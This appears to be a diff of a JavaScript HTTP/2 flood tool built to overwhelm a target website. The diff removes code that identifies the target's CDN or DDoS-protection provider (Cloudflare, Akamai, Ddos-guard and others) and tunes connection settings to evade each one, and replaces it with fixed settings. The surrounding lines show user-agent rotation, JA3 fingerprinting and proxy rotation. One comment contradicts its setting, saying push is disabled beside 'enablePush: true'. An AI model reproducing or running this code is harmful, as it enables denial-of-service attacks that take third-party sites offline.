@@ -1901,38 +1901,6 @@ const nullHexs = [
     "\x78"
     ];
 
-    let val 
-    let isp
-    let pro
-    async function getIPAndISP(url) {
-     try {
-       const { address } = await lookupPromise(url);
-       const apiUrl = `http://ip-api.com/json/${address}`;
-       const response = await fetch(apiUrl);
-       if (response.ok) {
-         const data = await response.json();
-          isp = data.isp;
-         console.log(' ISP :', url, ':', isp);
-       if (isp === 'Cloudflare, Inc.') {
-       }else if (isp === 'Akamai Technologies, Inc.' && 'Akamai International B.V.') {
-        pro = {'Quic-Version' : '0x00000001'}
-        val = { 'NEl': JSON.stringify({
-         "report_to":"default",
-         "max_age":3600,
-         "include_subdomains":true}),
-         }
-       } else {
-       val = {'Etag': "71735e063326b9646d2a4f784ac057ff"}
-       pro = {'Strict-Transport-Security': 'max-age=31536000'}
-       }
-       } else {
-        return
-       }
-     } catch (error) {
-       return
-      }
-    }
-
 function generateRandomString(length) {
   const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   let result = '';
@@ -2090,7 +2058,6 @@ const uap = generateUniqueUserAgents(100); // Generate 100 unique user agents
  const parsedTarget = new URL(args.target);
  const target_url = parsedTarget.host;
  parsedTarget.path = parsedTarget.pathname + parsedTarget.search;
- getIPAndISP(target_url);
   const generateJA3 = (cipherSuites, extensions) => {
     const ja3String = cipherSuites.join(',') + ',' + extensions.join(',');
     return crypto.createHash('md5').update(ja3String).digest('hex');
@@ -2416,176 +2383,29 @@ headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + ":443; ma=7200" });   
         
         
         const client = http2.connect(parsedTarget.href, {
-          protocol: "https:",
-          settings: getSettingsBasedOnISP(isp),
-          maxDeflateDynamicTableSize: 4294967295,
-          createConnection: () => tlsConn,
-          socket: connection,
-      });
-
-      client.settings({
-          headerTableSize: 65536,
-          maxConcurrentStreams: 1000,
-          initialWindowSize: 6291456,
-          maxHeaderListSize: 262144,
-          enablePush: false,
-      });
+            createConnection: () => tlsConn,
+            protocol: "https:",
+            settings: {
+                headerTableSize: 4096, // Ukuran header table yang lebih kecil
+                maxConcurrentStreams: 100, // Batasan jumlah stream yang lebih rendah
+                initialWindowSize: 65535, // Ukuran awal window yang lebih kecil
+                maxHeaderListSize: 8192, // Ukuran maksimum daftar header yang lebih kecil
+                enablePush: true, // Push dinonaktifkan
+            },
+            maxSessionMemory: 64000, // Ukuran memori sesi yang lebih kecil
+            maxDeflateDynamicTableSize: 4096, // Ukuran tabel deflate yang lebih kecil
+            socket: connection,
+        });
+        
+        client.settings({
+            headerTableSize: 4096, // Ukuran header table yang lebih kecil
+            maxConcurrentStreams: 100, // Batasan jumlah stream yang lebih rendah
+            initialWindowSize: 65535, // Ukuran awal window yang lebih kecil
+            maxHeaderListSize: 8192, // Ukuran maksimum daftar header yang lebih kecil
+            enablePush: true, // Push dinonaktifkan
+        });
 
       client.setMaxListeners(0);
-
-      function getSettingsBasedOnISP(isp) {
-        const settings = {
-          headerTableSize: 65536,
-          initialWindowSize: 6291456,
-          maxHeaderListSize: 262144,
-          enablePush: false,
-        };
-        
-        if (isp === 'Cloudflare, Inc.') {
-        
-          settings.maxConcurrentStreams = 100;
-
-          settings.initialWindowSize = 65536;
-
-          settings.maxFrameSize = 16384;
-          
-          settings.maxHeaderListSize = 262144;
-
-          settings.enablePush = false;
-
-          settings.enableConnectProtocol = false;
-
-
-        } else if (isp === 'FDCservers.net' || isp === 'OVH SAS' || isp == 'VNXCLOUD') {
-
-          settings.headerTableSize = 4096;
-          
-          settings.initialWindowSize = 65536;
-
-          settings.maxFrameSize = 16777215;
-
-          settings.maxConcurrentStreams = 128;
-
-          settings.maxHeaderListSize = 4294967295;
-
-          settings.enablePush = false;
-
-          settings.enableConnectProtocol = false;
-          
-        } else if (isp === 'Akamai Technologies, Inc.' || isp === 'Akamai International B.V.') {
-          
-          settings.headerTableSize = 4096;
-
-          settings.maxConcurrentStreams = 100;
-
-          settings.initialWindowSize = 6291456;
-
-          settings.maxFrameSize = 16384;
-
-          settings.maxHeaderListSize = 32768;
-
-          settings.enablePush = false;
-
-          settings.enableConnectProtocol = false;
-        
-        } else if (isp === 'Fastly, Inc.' || isp === 'Optitrust GmbH') {
-
-          settings.headerTableSize = 4096;
-
-          settings.enablePush = false;
-
-          settings.initialWindowSize = 65535;
-
-          settings.maxFrameSize = 16384;
-
-          settings.maxConcurrentStreams = 100;
-
-          settings.maxHeaderListSize = 4294967295;
-
-          settings.enableConnectProtocol = false;
-          
-        } else if (isp === 'Ddos-guard LTD') {
-
-          settings.maxHeaderListSize = 262144;
-
-          settings.maxConcurrentStreams = 8;
-
-          settings.initialWindowSize = 65535;
-
-          settings.maxFrameSize = 16777215;
-          
-          settings.maxHeaderListSize = 262144;
-
-          settings.enablePush = false;
-
-        } else if (isp === 'Amazon.com, Inc.' || isp === 'Amazon Technologies Inc.') {
-          
-          settings.maxHeaderListSize = 262144;
-
-          settings.maxConcurrentStreams = 100;
-
-          settings.initialWindowSize = 65535;
-
-          settings.maxHeaderListSize = 262144;
-
-          settings.enablePush = false;
-
-          settings.enableConnectProtocol = false;
-
-        } else if (isp === 'Microsoft Corporation' || isp === 'Vietnam Posts and Telecommunications Group' || isp === 'VIETNIX') {
-
-          settings.headerTableSize = 4096;
-
-          settings.enablePush = false;
-
-          settings.initialWindowSize = 8388608;
-
-          settings.maxFrameSize = 16384;
-
-          settings.maxConcurrentStreams = 100;
-
-          settings.maxHeaderListSize = 4294967295;
-
-          settings.enableConnectProtocol = false;
-          
-        
-        } else if (isp === 'Google LLC') {
-          
-          settings.headerTableSize = 4096;
-
-          settings.initialWindowSize = 1048576;
-          
-          settings.maxFrameSize = 16384;
-
-          settings.maxConcurrentStreams = 100;
-
-          settings.maxHeaderListSize = 137216;
-
-          settings.enablePush = false;
-
-          settings.enableConnectProtocol = false;
-
-        } else {
-
-          settings.headerTableSize = 65535;
-
-          settings.maxConcurrentStreams = 1000;
-
-          settings.initialWindowSize = 6291456;
-
-          settings.maxHeaderListSize = 261144;
-
-          settings.maxFrameSize = 16384;
-          
-          settings.enablePush = false;
-
-          settings.enableConnectProtocol = false;
-
-        }
-      
-        return settings;
-      
-     };
          
 const getRandomProxy = () => proxies[Math.floor(Math.random() * proxies.length)];
 
